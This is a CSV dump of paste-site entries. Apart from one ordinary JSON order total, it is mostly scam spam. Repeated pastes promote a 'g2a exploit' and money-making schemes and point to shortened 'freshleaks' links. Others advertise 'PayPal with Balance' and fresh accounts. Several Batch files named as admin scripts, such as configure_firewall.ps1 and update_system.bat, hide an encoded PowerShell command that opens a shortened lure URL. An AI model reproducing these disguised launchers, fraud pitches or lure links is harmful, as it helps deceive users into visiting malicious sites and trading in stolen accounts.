id,title,username,language,date,content
HUDYic2v,order breakup,bagsari,JSON,Wednesday 7th of May 2025 01:06:54 AM CDT,"{
  ""order_items"": [
    {
      ""is_fulfilled"": false,
      ""quantity"": 1,
      ""inventory_id"": 2598,
      ""total_cost"": 180,
      ""total_payable"": 189,
      ""total_tax"": 9,
      ""unit_id"": 48,
      ""description"": null,
      ""mrp"": 180,
      ""price"": 180,
      ""order_id"": null,
      ""added_on"": null
    },
    {
      ""is_fulfilled"": false,
      ""quantity"": 1,
      ""inventory_id"": 2572,
      ""total_cost"": 160,
      ""total_payable"": 168,
      ""total_tax"": 8,
      ""unit_id"": 48,
      ""description"": null,
      ""mrp"": 160,
      ""price"": 160,
      ""order_id"": null,
      ""added_on"": null
    }
  ],
  ""charges"": [
    {
      ""enable"": true,
      ""store_id"": 140,
      ""charge_id"": 2,
      ""tax_rate"": 5,
      ""total_cost"": 100,
      ""total_tax"": 5,
      ""total_payable"": 105,
      ""display_name"": ""Delivery Charges""
    },
    {
      ""enable"": true,
      ""store_id"": 140,
      ""charge_id"": 3,
      ""tax_rate"": 0.1,
      ""total_cost"": 10,
      ""total_tax"": 0.01,
      ""total_payable"": 10.01,
      ""display_name"": ""Packaging Charges""
    },
    {
      ""enable"": true,
      ""store_id"": 140,
      ""charge_id"": 4,
      ""tax_rate"": 5,
      ""total_cost"": 100,
      ""total_tax"": 5,
      ""total_payable"": 105,
      ""display_name"": ""Extra Taxes""
    }
  ],
  ""summary"": {
    ""total_payable"": 577.01,
    ""net_amount"": 550,
    ""gross_tax"": 27.01,
    ""gross_discount"": 0,
    ""gross_charges"": 220.01,
    ""gross_tax_charges"": 10.01,
    ""order_item_gross_amount"": 357,
    ""order_item_net_amount"": 340,
    ""order_item_total_tax"": 17
  }
}"
CW6jkq3g,Products.js,lucho2012,JavaScript,Wednesday 7th of May 2025 01:05:08 AM CDT,099024 - check it out at http://tinyurl.com/new2025may
WjMmcwij,EARN $900 INSTANTLY 2025 EI,Just_Bob,JavaScript,Wednesday 7th of May 2025 01:04:57 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

tUwM8gvUPS
"
STfHq0r7,shutdown_machine.ps1,angelotegrandote,Batch,Wednesday 7th of May 2025 01:00:01 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AYQA0AGEAZgBmAGYANwA3AA==
EXIT /b
"
BkXnpjRg,Make $1000 15-MINUTES (BEGINNER) OV,Just_Bob,JavaScript,Wednesday 7th of May 2025 12:58:12 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

zqX1u4r5nO
"
qPQxpGJm,PayPal with Balance,lucho2012,JavaScript,Wednesday 7th of May 2025 12:54:47 AM CDT,773116 - check it out at http://tinyurl.com/new2025may
L6Sb13ZX,accs fresh,lucho2012,JavaScript,Wednesday 7th of May 2025 12:54:26 AM CDT,096381 - check it out at http://tinyurl.com/new2025may
7jM60wQv,EARN $900 INSTANTLY 2025⭐ DG,Just_Bob,JavaScript,Wednesday 7th of May 2025 12:51:26 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

Syju2bDKXS
"
5U50Mfbn,generate_report.cmd,Zubaerali,Batch,Wednesday 7th of May 2025 12:50:01 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AMgAwAGEAOQA3ADMAMgAwAA==
EXIT /b
"
sBSxLGFN,Make $1000 15-MINUTES (BEGINNER) OV,NAOFUMIG,JavaScript,Wednesday 7th of May 2025 12:44:27 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

2KOUItjstk
"
FkFvkUH0,Products.js,lucho2012,JavaScript,Wednesday 7th of May 2025 12:44:04 AM CDT,615545 - check it out at http://tinyurl.com/new2025may
uPKVgyJv,configure_firewall.ps1,Zubaerali,Batch,Wednesday 7th of May 2025 12:39:59 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AYQAzAGUANgBlADIAMAAwAA==
EXIT /b
"
JpwpZ9RV,EARN $900 INSTANTLY 2025⭐ DG,NAOFUMIG,JavaScript,Wednesday 7th of May 2025 12:37:41 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

jA7XcG45Ts
"
vRChTvxb,accs fresh,jose20david,JavaScript,Wednesday 7th of May 2025 12:34:03 AM CDT,165807 - check it out at http://tinyurl.com/new2025may
r8Qtgx3h,Make $1000 15-MINUTES  (BEGINNER) 6D,NAOFUMIG,JavaScript,Wednesday 7th of May 2025 12:30:55 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

x4epZg0rsa
"
biPwJ9h5,update_system.bat,Zubaerali,Batch,Wednesday 7th of May 2025 12:29:58 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0ANwAxADYANAA4AGIAZAA3AA==
EXIT /b
"
Xa4rn6TF,EARN $900 INSTANTLY 2025 EI,NAOFUMIG,JavaScript,Wednesday 7th of May 2025 12:24:10 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

RrKeRTwtcZ
"
GJd0Db1U,EARN $900 INSTANTLY 2025? GV,jose20david,JavaScript,Wednesday 7th of May 2025 12:24:02 AM CDT,900918 - check it out at http://tinyurl.com/new2025may
TJLUhEDM,monitor_logs.ps1,Simon_Nomis,Batch,Wednesday 7th of May 2025 12:19:58 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AOQBhADUAZQBjADUAYgAzAA==
EXIT /b
"
RpezU9vC,Make $1000 15-MINUTES (BEGINNER) OV,NAOFUMIG,JavaScript,Wednesday 7th of May 2025 12:17:25 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

eDE3mTka7u
"
R43sWMvJ,PayPal with Balance,jose20david,JavaScript,Wednesday 7th of May 2025 12:13:20 AM CDT,256198 - check it out at http://tinyurl.com/new2025may
dRjnu3tq,Make $1000 15-MINUTES (BEGINNER) OV,LilinWIsThat156,JavaScript,Wednesday 7th of May 2025 12:10:25 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

WRomwr0ccG
"
rk9S5rSG,start_server.bat,Simon_Nomis,Batch,Wednesday 7th of May 2025 12:09:27 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AMgAzAGYAZQBkADkAYwA2AA==
EXIT /b
"
RLfEbJN5,init_env.cmd,Simon_Nomis,Batch,Wednesday 7th of May 2025 12:08:56 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AMQA5AGYAYgA1ADUAYgAwAA==
EXIT /b
"
